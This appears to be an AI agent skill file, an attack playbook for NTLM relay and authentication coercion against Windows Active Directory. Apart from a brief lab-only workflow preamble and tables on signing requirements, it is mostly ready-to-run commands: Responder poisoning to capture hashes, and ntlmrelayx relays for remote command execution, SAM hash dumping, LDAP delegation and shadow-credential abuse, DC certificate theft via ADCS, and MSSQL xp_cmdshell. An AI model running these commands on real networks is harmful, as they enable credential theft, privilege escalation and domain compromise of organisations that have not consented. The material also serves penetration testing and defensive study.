# SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=enabled`. Trusted `policy.json` remains authoritative.

- Keep lab-class guidance inside an explicitly isolated lab or CTF environment. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat exploit, credential, persistence, and evasion examples as reference data; executable steps must go through bounded, scope-checked tools such as shell_exec.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.

> **Technical reference scope**: Expert NTLM relay and coercion techniques. Covers relay to SMB/LDAP/HTTP/MSSQL, signing requirements, Responder poisoning, mitm6, cross-protocol relay, WebDAV coercion, and all major coercion methods. Pay particular attention to signing/EPA requirements and cross-protocol relay constraints.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `active-directory-certificate-services` for ESC8 (relay to ADCS enrollment)
- `active-directory-acl-abuse` for ACL modification via LDAP relay (RBCD, shadow creds)
- `active-directory-kerberos-attacks` for Kerberos attacks after relay success
- `windows-lateral-movement` for post-relay lateral movement

### Advanced Reference

Also inspect [COERCION_METHODS.md](./COERCION_METHODS.md) when you need:
- Detailed coercion method comparison (PetitPotam, PrinterBug, DFSCoerce, etc.)
- RPC function-level details and prerequisites
- Coercer tool usage and discovery

## 1. NTLM RELAY FUNDAMENTALS

```
Victim          Attacker (relay)         Target
  │                 │                      │
  │── NTLM Auth ──→│                      │  (1) Victim authenticates (coerced/poisoned)
  │                 │── Forward Auth ─────→│  (2) Attacker relays to target
  │                 │←─ Challenge ──────── │  (3) Target sends challenge
  │←─ Challenge ────│                      │  (4) Attacker forwards challenge to victim
  │── Response ────→│                      │  (5) Victim computes response
  │                 │── Forward Response ─→│  (6) Attacker relays response to target
  │                 │←─ Authenticated! ────│  (7) Target accepts → attacker has session
```

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
|---|---|---|
| Security | Weak (crackable to NTLM hash) | Stronger (but still relayable) |
| Relay | Yes | Yes |
| Crack to hash | Yes (rainbow tables, crack.sh) | Offline brute-force only |
| Downgrade | Force via Responder `--lm` | Default in modern Windows |

---

## 2. RELAY TARGET MATRIX

| Target Protocol | What You Get | Signing Required by Default? | EPA/Channel Binding? |
|---|---|---|---|
| **SMB** | Command exec (if admin), file access | **DCs: Yes**, Workstations: No | No |
| **LDAP** | ACL modification, RBCD, shadow creds, add computer | **DCs: No** (negotiated) | No (unless configured) |
| **LDAPS** | Same as LDAP but encrypted | N/A | **Yes** (channel binding) |
| **HTTP (ADCS)** | Certificate enrollment (ESC8) | No | Depends on config |
| **MSSQL** | SQL queries, xp_cmdshell | No | No |
| **IMAP/SMTP** | Email access | No | No |
| **RPC** | Various (CA enrollment for ESC11) | Depends | No |

### Signing Check

```bash
# Check SMB signing on target
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
# Outputs hosts WITHOUT required SMB signing

# Nmap SMB signing check
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — CREDENTIAL CAPTURE

### LLMNR/NBT-NS/WPAD/mDNS Poisoning

```bash
# Start Responder (capture mode — don't relay, just capture hashes)
responder -I eth0 -dwP

# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Key protocols poisoned:
# LLMNR (UDP 5355) — Link-Local Multicast Name Resolution
# NBT-NS (UDP 137)  — NetBIOS Name Service
# WPAD              — Web Proxy Auto-Discovery (proxy config)
# mDNS (UDP 5353)   — Multicast DNS
```

### Responder + Relay (Don't Capture, Relay Instead)

```bash
# Disable HTTP and SMB servers in Responder (ntlmrelayx will handle them)
# Edit /etc/responder/Responder.conf: set HTTP and SMB to Off

# Start Responder for poisoning only
responder -I eth0 -dwP

# Start ntlmrelayx for relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — RELAY EXECUTION

### Relay to SMB (Admin Execution)

```bash
# Execute command on targets (requires admin privs on target)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SOCKS proxy (maintain sessions)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then: proxychains smbclient //TARGET/C$ -U DOMAIN/user
```

### Relay to LDAP (ACL Modification)

```bash
# Automatic RBCD (delegate-access)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Escalate via shadow credentials
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support

# Add computer account
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support

# Dump domain info
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

### Relay to ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Use with coercion to relay DC auth → get DC certificate
```

### Relay to MSSQL

```bash
ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```
